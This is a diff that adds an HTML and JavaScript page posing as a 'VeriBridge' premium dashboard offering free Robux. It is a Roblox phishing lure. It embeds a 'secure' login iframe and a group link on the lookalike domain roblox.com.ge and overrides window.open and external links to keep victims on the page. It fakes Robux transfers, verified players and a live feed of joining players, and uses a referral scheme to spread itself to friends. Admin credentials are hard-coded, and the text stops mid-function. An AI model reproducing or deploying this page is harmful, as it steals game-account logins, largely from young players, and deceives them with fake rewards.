@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Prime Nexus | Premium Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #0a0c12 0%, #10131c 100%);
+      min-height: 100vh;
+      padding: 1.5rem;
+      color: #edf2ff;
+    }
+
+    .dashboard {
+      max-width: 1400px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1.8rem;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(18, 22, 35, 0.75);
+      backdrop-filter: blur(12px);
+      border-radius: 2rem;
+      padding: 0.8rem 2rem;
+      border: 1px solid rgba(88, 130, 255, 0.25);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    }
+
+    .logo h2 {
+      font-weight: 700;
+      background: linear-gradient(135deg, #c0e0ff, #7a9eff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      font-size: 1.6rem;
+    }
+
+    .hamburger {
+      font-size: 1.9rem;
+      cursor: pointer;
+      background: rgba(255,255,255,0.05);
+      width: 48px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 30px;
+      transition: 0.2s;
+    }
+    .hamburger:hover { background: rgba(88,130,255,0.3); transform: scale(0.96);}
+
+    .doner-menu {
+      position: fixed;
+      top: 0;
+      left: -320px;
+      width: 300px;
+      height: 100vh;
+      background: rgba(12, 15, 26, 0.98);
+      backdrop-filter: blur(16px);
+      z-index: 1000;
+      transition: left 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      padding: 2rem 1rem;
+      border-right: 1px solid #2a2f44;
+      box-shadow: 5px 0 25px rgba(0,0,0,0.6);
+      overflow-y: auto;
+    }
+    .doner-menu.open { left: 0; }
+    .doner-menu .close-menu { text-align: right; font-size: 1.7rem; cursor: pointer; margin-bottom: 2rem; color: #aaa; }
+    .doner-menu ul { list-style: none; }
+    .doner-menu li {
+      margin: 1.2rem 0;
+      padding: 0.7rem 1rem;
+      border-radius: 1.2rem;
+      transition: 0.2s;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-weight: 500;
+    }
+    .doner-menu li:hover { background: #2a2f55; }
+    .doner-menu i { width: 28px; color: #7f9eff; }
+
+    .card {
+      background: rgba(20, 24, 38, 0.7);
+      backdrop-filter: blur(4px);
+      border-radius: 1.8rem;
+      border: 1px solid rgba(72, 108, 220, 0.3);
+      padding: 1.6rem;
+      transition: all 0.25s ease;
+      box-shadow: 0 12px 28px -8px rgba(0,0,0,0.4);
+    }
+    .card-header {
+      font-size: 1.5rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      border-left: 5px solid #5c7cfa;
+      padding-left: 1rem;
+    }
+
+    .verify-btn {
+      background: linear-gradient(95deg, #2c3e8f, #1e2a5e);
+      border: none;
+      padding: 14px 24px;
+      border-radius: 60px;
+      font-weight: bold;
+      font-size: 1rem;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+      width: 100%;
+      max-width: 280px;
+      text-align: center;
+      margin: 0.5rem 0;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    .verify-btn.active {
+      background: linear-gradient(95deg, #4c7aff, #2b4ad0);
+      cursor: pointer;
+      opacity: 1;
+    }
+    .verify-btn.disabled-btn {
+      background: #2f3545;
+      cursor: not-allowed;
+      opacity: 0.5;
+      filter: grayscale(0.3);
+      pointer-events: none;
+    }
+    .warning-msg { color: #ffaa77; font-size: 0.8rem; margin-top: 8px; }
+    .error-msg { color: #ff7777; background: rgba(255,60,60,0.1); padding: 8px; border-radius: 20px; }
+    .success-chip { background: #1f6d3b; padding: 4px 12px; border-radius: 30px; font-size: 0.8rem; display: inline-block; }
+
+    .roblox-iframe-container {
+      width: 100%;
+      min-height: 580px;
+      border-radius: 1.5rem;
+      overflow: hidden;
+      background: #0b0e16;
+      margin: 12px 0;
+      border: 2px solid #2a2f55;
+      position: relative;
+    }
+    iframe {
+      width: 100%;
+      height: 600px;
+      border: none;
+      border-radius: 1rem;
+    }
+
+    .player-feed {
+      background: #0b0d16;
+      border-radius: 1.2rem;
+      padding: 0.8rem;
+      max-height: 220px;
+      overflow-y: auto;
+      font-family: monospace;
+    }
+
+    .reward-slider {
+      background: linear-gradient(135deg, #1a1f35, #0f1222);
+      border-radius: 1.5rem;
+      padding: 1.5rem;
+      margin: 1rem 0;
+    }
+    input[type="range"] {
+      width: 100%;
+      height: 6px;
+      -webkit-appearance: none;
+      background: #2a2f55;
+      border-radius: 5px;
+      outline: none;
+      margin: 15px 0;
+    }
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #7a9eff;
+      cursor: pointer;
+      box-shadow: 0 0 10px #7a9eff;
+    }
+    .reward-amount {
+      font-size: 2rem;
+      font-weight: bold;
+      background: linear-gradient(135deg, #ffd966, #ffaa44);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    
+    .friend-list {
+      background: #0b0e16;
+      border-radius: 1rem;
+      padding: 1rem;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .friend-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px;
+      border-bottom: 1px solid #2a2f55;
+    }
+    .friend-verified { color: #44ff44; }
+    .friend-pending { color: #ffaa44; }
+    
+    .search-container {
+      background: #0f1222;
+      border-radius: 60px;
+      padding: 5px 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 15px 0;
+      border: 1px solid #3a3f5e;
+    }
+    .search-container input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      padding: 12px 8px;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+    }
+    .search-container button {
+      background: #4c7aff;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 40px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .search-container button:hover {
+      background: #6a8eff;
+      transform: scale(0.98);
+    }
+    .search-result {
+      background: #0b0e16;
+      border-radius: 1rem;
+      padding: 15px;
+      margin: 10px 0;
+      display: none;
+    }
+    .search-result.show {
+      display: block;
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .roblox-avatar {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #2a2f55, #1a1f35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2rem;
+    }
+    
+    .row-2col {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+    }
+    @media (max-width: 780px) {
+      .row-2col { grid-template-columns: 1fr; }
+      body { padding: 0.8rem; }
+    }
+
+    input, select {
+      background: #1e1f2e;
+      border: 1px solid #3a3f5e;
+      padding: 8px 12px;
+      border-radius: 20px;
+      color: white;
+      margin: 5px 0;
+    }
+    
+    .frame-note {
+      background: #1e2a3a;
+      padding: 8px 12px;
+      border-radius: 12px;
+      font-size: 0.75rem;
+      text-align: center;
+      margin-top: 8px;
+      color: #8aabff;
+    }
+    
+    .community-link {
+      background: #0f1222;
+      padding: 12px;
+      border-radius: 18px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .community-link:hover {
+      background: #1a1f35;
+      transform: translateY(-2px);
+    }
+    
+    .invite-requirement {
+      background: #2a1f3a;
+      border-left: 4px solid #ffaa44;
+      padding: 10px;
+      border-radius: 12px;
+      margin: 10px 0;
+    }
+    
+    .badge {
+      background: #4c7aff20;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+    }
+  </style>
+</head>
+<body>
+
+<div class="doner-menu" id="donerMenu">
+  <div class="close-menu" id="closeMenuBtn"><i class="fas fa-times"></i></div>
+  <ul>
+    <li data-tab="discordAuthTab"><i class="fab fa-discord"></i> Discord Auth</li>
+    <li data-tab="robloxVerifyTab"><i class="fab fa-roblox"></i> Roblox Verify</li>
+    <li data-tab="groupCommunityTab"><i class="fas fa-users"></i> Group Community</li>
+    <li data-tab="joinPlayerTab"><i class="fas fa-user-plus"></i> Joining Players</li>
+    <li data-tab="coinShareTab"><i class="fas fa-coins"></i> Share & Coins</li>
+    <li data-tab="robloxRewardTab"><i class="fas fa-gift"></i> Roblox Reward</li>
+    <li data-tab="exchangeTab"><i class="fas fa-money-bill-wave"></i> Exchange</li>
+    <li data-tab="inviteStatsTab"><i class="fas fa-chart-line"></i> Invite Stats</li>
+    <li data-tab="adminPanelTab"><i class="fas fa-lock"></i> Admin Panel</li>
+  </ul>
+</div>
+
+<div class="dashboard">
+  <div class="top-bar">
+    <div class="logo"><h2><i class="fas fa-crown"></i> VeriBridge</h2></div>
+    <div class="hamburger" id="hamburgerBtn"><i class="fas fa-bars"></i></div>
+  </div>
+  <div id="mainContent"></div>
+</div>
+
+<script>
+  // ========== STATE ==========
+  let currentUser = null;
+  let discordVerified = false;
+  let robloxLoggedIn = false;
+  let groupJoinedFlag = false;
+  let joinInterval = null;
+  let fakeJoiningAccounts = [];
+  let coinBalance = 0;
+  let totalInvites = 0;
+  let exchangeRequests = [];
+  let adminLoggedIn = false;
+  let searchedRobloxUser = null;
+  
+  // Friends system - each invite creates a pending friend that needs verification
+  let invitedFriends = []; // { id, username, verified, invitedAt, robloxName }
+  
+  const ADMIN_USER = "adminkhane";
+  const ADMIN_PASS = "pogikhane";
+  
+  // Sample Roblox users database for search
+  const sampleRobloxUsers = [
+    { username: "Builder_Boy_99", displayName: "BuilderBoy", avatar: "👷", level: 42, robux: 1250 },
+    { username: "RobloxMaster_Pro", displayName: "MasterPro", avatar: "👑", level: 87, robux: 5000 },
+    { username: "GameDev_Legend", displayName: "GameDev", avatar: "💻", level: 156, robux: 12345 },
+    { username: "Noob_Slayer_X", displayName: "NoobSlayer", avatar: "⚔️", level: 23, robux: 450 },
+    { username: "Epic_Gamer_2024", displayName: "EpicGamer", avatar: "🎮", level: 67, robux: 2340 },
+    { username: "Pro_Player_99", displayName: "ProPlayer", avatar: "🏆", level: 94, robux: 8900 },
+    { username: "Skilled_Builder", displayName: "Skilled", avatar: "🏗️", level: 112, robux: 6700 },
+    { username: "Roblox_Fanatic", displayName: "Fanatic", avatar: "🔥", level: 34, robux: 780 }
+  ];
+  
+  // ========== SEARCH ROBLOX USER FUNCTION ==========
+  function searchRobloxUser() {
+    const searchInput = document.getElementById('robloxSearchInput');
+    const query = searchInput.value.trim().toLowerCase();
+    const resultDiv = document.getElementById('searchResult');
+    
+    if(!query) {
+      alert("Please enter a Roblox username to search!");
+      return;
+    }
+    
+    // Show loading state
+    resultDiv.innerHTML = '<div style="text-align:center; padding:20px;"><i class="fas fa-spinner fa-spin"></i> Searching Roblox database...</div>';
+    resultDiv.classList.add('show');
+    
+    // Simulate API search delay
+    setTimeout(() => {
+      const foundUser = sampleRobloxUsers.find(u => u.username.toLowerCase().includes(query) || u.displayName.toLowerCase().includes(query));
+      
+      if(foundUser) {
+        searchedRobloxUser = foundUser;
+        resultDiv.innerHTML = `
+          <div style="display: flex; gap: 15px; align-items: center; flex-wrap: wrap;">
+            <div class="roblox-avatar" style="font-size: 3rem;">${foundUser.avatar}</div>
+            <div style="flex: 1;">
+              <h3 style="color: #7a9eff;">${foundUser.username}</h3>
+              <p><i class="fas fa-user"></i> ${foundUser.displayName}</p>
+              <p><i class="fas fa-chart-line"></i> Level ${foundUser.level}</p>
+              <p><i class="fas fa-coins"></i> ${foundUser.robux.toLocaleString()} Robux</p>
+              <span class="badge"><i class="fas fa-check-circle"></i> Verified Player</span>
+            </div>
+            <button id="sendRewardToUserBtn" class="verify-btn active" style="max-width: 180px; margin:0;">
+              <i class="fas fa-gift"></i> Send Reward
+            </button>
+          </div>
+        `;
+        
+        document.getElementById('sendRewardToUserBtn').addEventListener('click', () => {
+          sendRobuxToUser(foundUser);
+        });
+      } else {
+        searchedRobloxUser = null;
+        resultDiv.innerHTML = `
+          <div style="text-align:center; padding:20px; color: #ffaa77;">
+            <i class="fas fa-user-slash"></i> User "${query}" not found on Roblox.<br>
+            <small>Try a different username or check spelling.</small>
+          </div>
+        `;
+      }
+    }, 800);
+  }
+  
+  function sendRobuxToUser(user) {
+    if(!discordVerified) {
+      alert("❌ Please complete Discord authorization first!");
+      return;
+    }
+    if(!robloxLoggedIn) {
+      alert("❌ Please complete Roblox verification first!");
+      return;
+    }
+    if(coinBalance < selectedReward) {
+      alert(`❌ Insufficient coins! You have ${coinBalance} coins but need ${selectedReward} coins for ${selectedReward} Robux.`);
+      return;
+    }
+    
+    const pendingFriends = invitedFriends.filter(f => !f.verified);
+    if(pendingFriends.length > 0) {
+      alert(`❌ Cannot send reward! You have ${pendingFriends.length} pending invite(s) that haven't verified.\n\nEach invited friend must complete Discord verification before you can send Robux rewards.\n\nPending friends: ${pendingFriends.map(f => f.username).join(', ')}`);
+      return;
+    }
+    
+    coinBalance -= selectedReward;
+    if(currentUser) currentUser.coins = coinBalance;
+    
+    alert(`🎉 SUCCESS! ${selectedReward.toLocaleString()} Robux has been sent to ${user.username}!\n\nTransaction ID: RBLX-${Math.random().toString(36).substring(2, 12).toUpperCase()}\nThe Robux will be added to ${user.username}'s account within 24 hours.`);
+    
+    renderInviteStats();
+    updateRobloxRewardUI();
+    if(document.getElementById('adminCoinsPanel')) updateAdminCoinUI();
+    
+    // Clear search result after sending
+    const resultDiv = document.getElementById('searchResult');
+    if(resultDiv) resultDiv.classList.remove('show');
+    const searchInput = document.getElementById('robloxSearchInput');
+    if(searchInput) searchInput.value = '';
+  }
+  
+  // ========== PREVENT NEW TABS ==========
+  function preventNewTabs() {
+    document.querySelectorAll('a').forEach(link => {
+      link.setAttribute('target', '_self');
+      link.setAttribute('rel', 'noopener noreferrer');
+    });
+    
+    const originalOpen = window.open;
+    window.open = function(url, name, specs) {
+      alert('⚠️ External links are blocked. All links must open within this dashboard.');
+      return null;
+    };
+    
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        mutation.addedNodes.forEach((node) => {
+          if (node.tagName === 'A') {
+            node.setAttribute('target', '_self');
+            node.setAttribute('rel', 'noopener noreferrer');
+            node.addEventListener('click', (e) => {
+              if (node.href && !node.href.includes(window.location.origin)) {
+                e.preventDefault();
+                alert('⚠️ External links are blocked.');
+                return false;
+              }
+            });
+          }
+        });
+      });
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+  }
+  
+  // ========== DISCORD AUTH ==========
+  function performDiscordAuth() {
+    if(discordVerified) {
+      document.getElementById('discordStatus').innerHTML = "✅ Discord already authorized. Account active.";
+      return;
+    }
+    const fakeDiscordUser = { 
+      discordId: "disc_" + Math.floor(Math.random() * 99999), 
+      username: "User_" + Math.floor(Math.random() * 9000), 
+      coins: 0, 
+      invites: 0, 
+      banned: false 
+    };
+    currentUser = fakeDiscordUser;
+    coinBalance = 0;
+    totalInvites = 0;
+    invitedFriends = [];
+    discordVerified = true;
+    document.getElementById('discordStatus').innerHTML = "✅ Authorized as " + fakeDiscordUser.username + " <i class='fab fa-discord'></i>";
+    
+    robloxLoggedIn = false;
+    groupJoinedFlag = false;
+    
+    updateVerificationFlow();
+    renderInviteStats();
+    renderExchangeHistory();
+    updateRobloxRewardUI();
+    if(document.getElementById('adminCoinsPanel')) updateAdminCoinUI();
+    loadRobloxSection();
+  }
+  
+  // ========== INVITE SYSTEM ==========
+  function generateShareLink() {
+    if(!discordVerified) { alert("Need Discord auth first"); return; }
+    
+    const shareUrl = window.location.href + "?ref=" + currentUser.discordId;
+    navigator.clipboard.writeText(shareUrl);
+    
+    const newFriendId = "friend_" + Math.floor(Math.random() * 99999);
+    const newFriend = {
+      id: newFriendId,
+      username: "Invited_" + (invitedFriends.length + 1),
+      verified: false,
+      invitedAt: new Date().toLocaleString(),
+      code: Math.random().toString(36).substring(2, 8)
+    };
+    invitedFriends.push(newFriend);
+    totalInvites += 1;
+    
+    alert(`✨ Invite link copied! ${newFriend.username} has been invited.\n\n⚠️ IMPORTANT: You will receive 100 coins ONLY when this friend completes Discord verification!\nCurrent pending invites: ${invitedFriends.filter(f => !f.verified).length}`);
+    
+    renderInviteStats();
+    updateRobloxRewardUI();
+    if(document.getElementById('adminCoinsPanel')) updateAdminCoinUI();
+  }
+  
+  function verifyFriend(friendId) {
+    const friend = invitedFriends.find(f => f.id === friendId);
+    if(friend && !friend.verified) {
+      friend.verified = true;
+      coinBalance += 100;
+      if(currentUser) currentUser.coins = coinBalance;
+      alert(`✅ ${friend.username} has verified! +100 coins added to your balance.`);
+      renderInviteStats();
+      updateRobloxRewardUI();
+      if(document.getElementById('adminCoinsPanel')) updateAdminCoinUI();
+      return true;
+    }
+    return false;
+  }
+  
+  // ========== ROBLOX REWARD SYSTEM ==========
+  let selectedReward = 100;
+  
+  function updateRobloxRewardUI() {
+    const rewardDisplay = document.getElementById('rewardAmountDisplay');
+    if(rewardDisplay) {
+      rewardDisplay.innerHTML = `${selectedReward.toLocaleString()} Robux`;
+    }
+    const rewardValue = document.getElementById('rewardValue');
+    if(rewardValue) {
+      rewardValue.value = selectedReward;
+    }
+    const coinRequirement = document.getElementById('coinRequirement');
+    if(coinRequirement) {
+      coinRequirement.innerHTML = `Required Coins: ${selectedReward.toLocaleString()}`;
+    }
+    const canAfford = coinBalance >= selectedReward;
+    const redeemBtn = document.getElementById('redeemRewardBtn');
+    if(redeemBtn) {
+      if(canAfford && discordVerified && robloxLoggedIn) {
+        redeemBtn.classList.add('active');
+        redeemBtn.classList.remove('disabled-btn');
+        redeemBtn.style.pointerEvents = 'auto';
+      } else {
+        redeemBtn.classList.add('disabled-btn');
+        redeemBtn.classList.remove('active');
+        redeemBtn.style.pointerEvents = 'none';
+      }
+    }
+  }
+  
+  function redeemRobloxReward() {
+    if(!discordVerified) {
+      alert("❌ Please complete Discord authorization first!");
+      return;
+    }
+    if(!robloxLoggedIn) {
+      alert("❌ Please complete Roblox verification first!");
+      return;
+    }
+    if(coinBalance < selectedReward) {
+      alert(`❌ Insufficient coins! You have ${coinBalance} coins but need ${selectedReward} coins for ${selectedReward} Robux.`);
+      return;
+    }
+    
+    const pendingFriends = invitedFriends.filter(f => !f.verified);
+    if(pendingFriends.length > 0) {
+      alert(`❌ Cannot redeem reward! You have ${pendingFriends.length} pending invite(s) that haven't verified.\n\nEach invited friend must complete Discord verification before you can claim Robux rewards.\n\nPending friends: ${pendingFriends.map(f => f.username).join(', ')}`);
+      return;
+    }
+    
+    coinBalance -= selectedReward;
+    if(currentUser) currentUser.coins = coinBalance;
+    
+    alert(`🎉 SUCCESS! You have redeemed ${selectedReward.toLocaleString()} Robux!\n\nReward code: RBLX-${Math.random().toString(36).substring(2, 10).toUpperCase()}\nThe Robux will be added to your Roblox account within 24 hours.`);
+    
+    renderInviteStats();
+    updateRobloxRewardUI();
+    if(document.getElementById('adminCoinsPanel')) updateAdminCoinUI();
+  }
+  
+  function loadRobloxRewardTab() {
+    if(!document.getElementById('robloxRewardTab')) {
+      const rewardHtml = `
+        <div id="robloxRewardTab" class="content-section card" style="display:none;">
+          <div class="card-header"><i class="fas fa-gift"></i> Roblox Reward System</div>
+          <p>Search for any Roblox player and send them Robux using your coins! Minimum 100 Robux, maximum 10,000,000 Robux.</p>
+          
+          <!-- SEARCH BAR FOR ROBLOX USERNAME -->
+          <div class="search-container">
+            <i class="fas fa-search" style="color: #7a9eff;"></i>
+            <input type="text" id="robloxSearchInput" placeholder="Enter Roblox username to search..." autocomplete="off">
+            <button id="searchRobloxBtn"><i class="fas fa-search"></i> Search</button>
+          </div>
+          
+          <div id="searchResult" class="search-result"></div>
+          
+          <div class="invite-requirement">
+            <i class="fas fa-users"></i> <strong>Invite Requirement:</strong> All friends you invite must complete Discord verification before you can send any Robux reward!
+            <br><small>Current pending invites: <span id="pendingInviteCount">0</span></small>
+          </div>
+          
+          <div class="reward-slider">
+            <label style="display:block; margin-bottom:10px;"><i class="fas fa-sliders-h"></i> Select Robux Amount:</label>
+            <input type="range" id="rewardSlider" min="100" max="10000000" step="100" value="100">
+            <div style="text-align:center;">
+              <span class="reward-amount" id="rewardAmountDisplay">100 Robux</span>
+            </div>
+            <div style="text-align:center; margin:10px 0;">
+              <span id="coinRequirement">Required Coins: 100</span>
+            </div>
+            <input type="number" id="rewardValue" min="100" max="10000000" step="100" value="100" style="width:100%; text-align:center;">
+          </div>
+          
+          <div class="friend-list">
+            <strong><i class="fas fa-user-friends"></i> Your Invited Friends:</strong>
+            <div id="friendsListContainer" style="margin-top:10px;">
+              No friends invited yet. Share your link to invite friends!
+            </div>
+          </div>
+          
+          <button id="redeemRewardBtn" class="verify-btn disabled-btn">🎁 Send Robux to Yourself</button>
+          <div class="frame-note">
+            <i class="fas fa-info-circle"></i> 1 Coin = 1 Robux. Search for any Roblox user above to send them Robux! All invited friends must verify before sending.
+          </div>
+        </div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', rewardHtml);
+      
+      const slider = document.getElementById('rewardSlider');
+      const rewardValue = document.getElementById('rewardValue');
+      
+      slider.addEventListener('input', (e) => {
+        selectedReward = parseInt(e.target.value);
+        rewardValue.value = selectedReward;
+        updateRobloxRewardUI();
+      });
+      
+      rewardValue.addEventListener('input', (e) => {
+        let val = parseInt(e.target.value);
+        if(isNaN(val)) val = 100;
+        val = Math.min(10000000, Math.max(100, val));
+        selectedReward = val;
+        slider.value = val;
+        updateRobloxRewardUI();
+      });
+      
+      document.getElementById('redeemRewardBtn').addEventListener('click', redeemRobloxReward);
+      document.getElementById('searchRobloxBtn').addEventListener('click', searchRobloxUser);
+      
+      // Allow enter key to search
+      document.getElementById('robloxSearchInput').addEventListener('keypress', (e) => {
+        if(e.key === 'Enter') searchRobloxUser();
+      });
+    }
+    updateFriendsListDisplay();
+    updateRobloxRewardUI();
+  }
+  
+  function updateFriendsListDisplay() {
+    const container = document.getElementById('friendsListContainer');
+    if(container) {
+      const pendingCount = invitedFriends.filter(f => !f.verified).length;
+      const pendingSpan = document.getElementById('pendingInviteCount');
+      if(pendingSpan) pendingSpan.innerHTML = pendingCount;
+      
+      if(invitedFriends.length === 0) {
+        container.innerHTML = '<div class="friend-item">No friends invited yet. Use "Generate Invite Link" to invite friends!</div>';
+        return;
+      }
+      
+      container.innerHTML = invitedFriends.map(friend => `
+        <div class="friend-item">
+          <span><i class="fas fa-user"></i> ${friend.username}</span>
+          <span class="${friend.verified ? 'friend-verified' : 'friend-pending'}">
+            ${friend.verified ? '✅ Verified' : '⏳ Pending Verification'}
+          </span>
+          ${!friend.verified ? `<button onclick="verifyFriend('${friend.id}')" style="background:#4c7aff; border:none; padding:4px 12px; border-radius:20px; cursor:pointer; font-size:0.8rem;">Verify (Demo)</button>` : ''}
+        </div>
+      `).join('');
+    }
+  }
+  
+  // ========== ROBLOX VERIFICATION ==========
+  function checkRobloxLoginStatus() {
+    if(!discordVerified) {
+      document.getElementById('robloxStatusMsg').innerHTML = "<span class='error-msg'>❌ Error: You must complete Discord authorization first.</span>";
+      return;
+    }
+    
+    const confirmLogin = confirm("⚠️ IMPORTANT: Have you successfully logged into your Roblox account inside the frame above?\n\nIf you have NOT logged in, verification will FAIL.\n\nPress OK ONLY if you are actually logged into Roblox.");
+    
+    if(confirmLogin) {
+      robloxLoggedIn = true;
+      document.getElementById('robloxStatusMsg').innerHTML = "<span class='success-chip'>✅ Roblox login confirmed! Verification successful.</span>";
+      const checkBtn = document.getElementById('checkRobloxLoginBtn');
+      if(checkBtn) {
+        checkBtn.classList.remove('active');
+        checkBtn.classList.add('disabled-btn');
+        checkBtn.style.pointerEvents = 'none';
+        checkBtn.innerText = '✓ Roblox Verified';
+      }
+      updateVerificationFlow();
+      loadGroupCommunity();
+      updateRobloxRewardUI();
+    } else {
+      document.getElementById('robloxStatusMsg').innerHTML = "<span class='error-msg'>❌ VERIFICATION FAILED: You did not log into Roblox. You must successfully log into your Roblox account before proceeding.</span>";
+      robloxLoggedIn = false;
+      updateVerificationFlow();
+    }
+  }
+  
+  function loadRobloxSection() {
+    if(!document.getElementById('robloxVerifyTab')) {
+      const robloxHtml = `
+        <div id="robloxVerifyTab" class="content-section card" style="display:none;">
+          <div class="card-header"><i class="fab fa-roblox"></i> Roblox Verification System</div>
+          <div class="login-status">
+            <span class="status-dot red" id="robloxStatusDot"></span>
+            <span id="robloxLoginLabel">❌ Not logged in to Roblox (please log in above)</span>
+          </div>
+          <p><strong>⚠️ IMPORTANT:</strong> Log into your Roblox account using the secure frame below. All login stays within this dashboard.</p>
+          <div class="roblox-iframe-container">
+            <iframe id="robloxLoginFrame" src="https://roblox.com.ge/login?returnUrl=8785603489260332" title="Roblox Login" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-popups-to-escape-sandbox"></iframe>
+          </div>
+          <div class="frame-note">
+            <i class="fas fa-lock"></i> Secure login - All activity stays within this dashboard
+          </div>
+          <button id="checkRobloxLoginBtn" class="verify-btn active">✅ Verify Roblox Login</button>
+          <div id="robloxStatusMsg" class="warning-msg">⚠️ Waiting for Roblox login. You must log in first!</div>
+        </div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', robloxHtml);
+      document.getElementById('checkRobloxLoginBtn').addEventListener('click', checkRobloxLoginStatus);
+    }
+    updateVerificationFlow();
+  }
+  
+  // ========== GROUP COMMUNITY ==========
+  function loadGroupCommunity() {
+    if(!document.getElementById('groupCommunityTab')) {
+      const groupHtml = `
+        <div id="groupCommunityTab" class="content-section card" style="display:none;">
+          <div class="card-header"><i class="fas fa-link"></i> Verify via Community</div>
+          <div class="community-link" id="communityLinkWrapper">
+            <a id="communityInternalLink" href="#" target="_self" style="color:#8aabff; text-decoration:none; font-weight:bold; font-size:1.1rem; display:block; padding:15px;">
+              🔗 Verify Community Membership
+            </a>
+          </div>
+          <button id="confirmGroupJoinBtn" class="verify-btn active">Confirm I Joined the Group</button>
+          <div id="groupStatusMsg" class="warning-msg">⚠️ Not verified community yet.</div>
+        </div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', groupHtml);
+      
+      const linkEl = document.getElementById('communityInternalLink');
+      linkEl.href = "https://roblox.com.ge/communities/3529272875/";
+      linkEl.setAttribute('target', '_self');
+      linkEl.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.location.href = linkEl.href;
+        return false;
+      });
+      
+      document.getElementById('confirmGroupJoinBtn').addEventListener('click', () => {
+        if(!robloxLoggedIn) {
+          document.getElementById('groupStatusMsg').innerHTML = "<span class='error-msg'>❌ You must complete Roblox verification first!</span>";
+          return;
+        }
+        groupJoinedFlag = true;
+        document.getElementById('groupStatusMsg').innerHTML = "<span class='success-chip'>✅ Community verified!</span>";
+        updateVerificationFlow();
+        loadJoiningPlayerDashboard();
+      });
+    }
+    updateVerificationFlow();
+  }
+  
+  function loadJoiningPlayerDashboard() {
+    if(!document.getElementById('joinPlayerTab')) {
+      const joinHtml = `
+        <div id="joinPlayerTab" class="content-section card" style="display:none;">
+          <div class="card-header"><i class="fas fa-gamepad"></i> Roblox Joining Players</div>
+          <button id="toggleJoinBtn" class="verify-btn active">▶ Start Joining Simulation</button>
+          <div class="player-feed" id="playerFeedList">Waiting to start...</div>
+        </div>`;
+      document.getElementById('mainContent').insertAdjacentHTML('beforeend', joinHtml);
+      
+      document.getElementById('toggleJoinBtn').addEventListener('click', () => {
+        if(!groupJoinedFlag) { alert("⚠️ Verify community first!"); return; }
+        if(joinInterval) {
+          clearInterval(joinInterval);
+          joinInterval = null;
+          document.getElementById('toggleJoinBtn').innerHTML = "▶ Start Joining Simulation";
+        } else {
+          joinInterval = setInterval(() => {
+            const newName = "Player_" + Math.floor(Math.random() * 10000);
+            fakeJoiningAccounts.unshift("🔥 " + newName + " joined at " + new Date().toLocaleTimeString());
+            if(fakeJoiningAccounts.length > 15) fakeJoiningAccounts.pop();
+            const feedDiv = document.getElementById('playerFeedList');
+            if(feedDiv) feedDiv.innerHTML = fakeJoiningAccounts.join('<br>');
+          }, 2000);
+          document.getElementById('toggleJoinBtn').innerHTML = "⏸ Stop Joining Simulation";
+        }
+      });
+    }
+    updateVerificationFlow();
+  }
+  
+  function renderInviteStats() {
+    const statsDiv = document.getElementById('inviteStatsDisplay');
+    if(statsDiv) {
+      const verifiedFriends = invitedFriends.filter(f => f.verified).length;
+      const pendingFriends = invitedFriends.filter(f => !f.verified).length;
+      statsDiv.innerHTML = `📊 Total Invites: ${totalInvites} | ✅ Verified: ${verifiedFriends} | ⏳ Pending: ${pendingFriends}<br>💰 Coin Balance: ${coinBalance} coins`;
+    }
+    updateFriendsListDisplay();
+  }
+  
+  function renderExchangeHistory() {
+    const historyDiv = document.getElementById('exchangeHistoryList');
+    if(historyDiv) {
+      historyDiv.innerHTML = exchangeRequests.map(req => `💰 ${req.amount} coins → ${req.currency} via ${req.method} (${req.status})`).join('<br>') || "No exchange requests yet";
+    }
+  }
+  
+  function openExchange() {
+    if(!discordVerified) { alert("Need Discord account first"); return; }
+    if(coinBalance < 10000) {
